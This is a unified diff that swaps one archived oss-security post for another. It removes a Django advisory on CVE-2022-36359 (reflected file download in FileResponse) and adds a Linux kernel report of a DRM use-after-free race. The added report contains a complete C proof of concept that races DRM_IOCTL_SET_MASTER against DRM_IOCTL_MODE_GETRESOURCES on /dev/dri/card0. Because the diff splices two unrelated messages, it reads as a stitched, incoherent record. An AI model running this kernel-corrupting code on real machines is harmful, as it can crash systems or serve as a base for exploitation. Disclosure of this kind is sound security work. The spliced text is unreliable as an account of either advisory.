@@ -1,86 +1,79 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/08/03/1
-Message-ID: <CAJwKpyQHAbv6FP-xYbixE2gtgyfHwfeLutYgrNBZY7=+rjktBA@mail.gmail.com>
-Date: Wed, 3 Aug 2022 09:54:16 +0200
-From: Carlton Gibson <carlton.gibson@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/04/12/3
+Message-ID: <CAH5WSp6-nveUGNR8cEdXbFQs0m3AsDmhoN9sDx+WXfn2JsdjHg@mail.gmail.com>
+Date: Tue, 12 Apr 2022 19:42:04 +0800
+From: Minh Yuan <yuanmingbuaa@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Django: CVE-2022-36359: Potential reflected file download vulnerability in FileResponse.
+Subject: Linux kernel: A concurrency use-after-free between drm_setmaster_ioctl and drm_mode_getresources
 Content-Type: text/plain; charset=utf-8
 
-See: https://www.djangoproject.com/weblog/2022/aug/03/security-releases/
+Hi guys,
 
-In accordance with `our security release policy
-<https://docs.djangoproject.com/en/dev/internals/security/>`_, the Django
-team
-is issuing
-`Django 4.0.7 <https://docs.djangoproject.com/en/dev/releases/4.0.7/>`_, and
-`Django 3.2.15 <https://docs.djangoproject.com/en/dev/releases/3.2.15/>`_.
-These releases addresses the security issue detailed below. We encourage all
-users of Django to upgrade as soon as possible.
+We recently discovered a concurrency uaf in drm of the latest kernel
+version (Linux 4.19.237).
 
-CVE-2022-36359: Potential reflected file download vulnerability in
-``FileResponse``
-===================================================================================
+The root cause of this race is that drm_setmaster_ioctl can free an old
+*fpriv->master* in drm_new_set_master, while drm_mode_getresources holds a
+freed *fpriv->master *in drm_lease_held due to the absence of proper
+lock/refcounting.
 
-An application may have been vulnerable to a reflected file download (RFD)
-attack that sets the Content-Disposition header of a ``FileResponse``
-when the ``filename`` was derived from
-user-supplied input. The ``filename`` is now escaped to avoid this
-possibility.
+My unstable PoC is shown below (tested on Linux 4.19.237):
 
-This issue has high severity, according to the Django security policy.
+#include <endian.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include <sys/mman.h>
+#include <pthread.h>
+#include <sys/xattr.h>
+#include <sys/shm.h>
+#include <linux/userfaultfd.h>
+#include <sys/ioctl.h>
+#include <drm/drm.h>
+#include <drm/drm_mode.h>
 
-Thanks to Motoyasu Saburi for the report.
+#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
+} while (0)
+int fd;
+char a[0x100];
+void *thread1(void *arg)
+{
 
-Affected supported versions
-===========================
+ioctl(fd, DRM_IOCTL_SET_MASTER, 0);
 
-* Django main branch
-* Django 4.1 (which will be released in a separate blog post later today)
-* Django 4.0
-* Django 3.2
+}
+void *thread2(void *arg)
+{
+ioctl(fd, DRM_IOCTL_MODE_GETRESOURCES, &a);
+}
+int main(void)
+{
+pthread_t thr1,thr2;
 
-Resolution
-==========
+int fd1 = open("/dev/dri/card0",0);
+fd = open("/dev/dri/card0",0);
+int fd2 = dup3(fd,fd1,0);
+int s = pthread_create(&thr1,NULL,thread1,(void*)NULL);
+if(s != 0)
+errExit("pthread_create");
+s = pthread_create(&thr2,NULL,thread2,(void*)NULL);
+if(s != 0)
+errExit("pthread_create");
+pthread_join(thr1,NULL);
+pthread_join(thr2,NULL);
+close(fd);
+}
 
-Patches to resolve the issue have been applied to Django's main branch and
-the
-4.1, 4.0, and 3.2 release branches. The patches may be obtained from the
-following changesets:
-
-* On the `main branch <
-https://github.com/django/django/commit/bd062445cffd3f6cc6dcd20d13e2abed818fa173
->`__
-* On the `4.1 release branch <
-https://github.com/django/django/commit/46916665f9aa729067ef894e994854ecf9223157
->`__
-* On the `4.0 release branch <
-https://github.com/django/django/commit/b7d9529cbe0af4adabb6ea5d01ed8dcce3668fb3
->`__
-* On the `3.2 release branch <
-https://github.com/django/django/commit/b3e4494d759202a3b6bf247fd34455bf13be5b80
->`__
-
-The following releases have been issued:
-
-* Django 4.0.7 (`download Django 4.0.7 <
-https://www.djangoproject.com/m/releases/4.0/Django-4.0.7.tar.gz>`_ |
-`4.0.7 checksums <
-https://www.djangoproject.com/m/pgp/Django-4.0.7.checksum.txt>`_)
-* Django 3.2.15 (`download Django 3.2.15 <
-https://www.djangoproject.com/m/releases/3.2/Django-3.2.15.tar.gz>`_ |
-`3.2.15 checksums <
-https://www.djangoproject.com/m/pgp/Django-3.2.15.checksum.txt>`_)
-
-The PGP key ID used for this release is Carlton Gibson: `E17DF5C82B4F9D00 <
-https://github.com/carltongibson.gpg>`_.
-
-General notes regarding security reporting
-==========================================
-
-As always, we ask that potential security issues be reported via
-private email to ``security@...ngoproject.com``, and not via Django's
-Trac instance or the django-developers list. Please see `our security
-policies <https://www.djangoproject.com/security/>`_ for further
-information.
+Timeline:
+* 03.30.22 - Vulnerability reported to security@...nel.org.
+* 04.01.22 - Vulnerability reported to linux-distros@...openwall.org
+<security@...nel.org>.
+* 04.12.22 - Vulnerability opened.
 
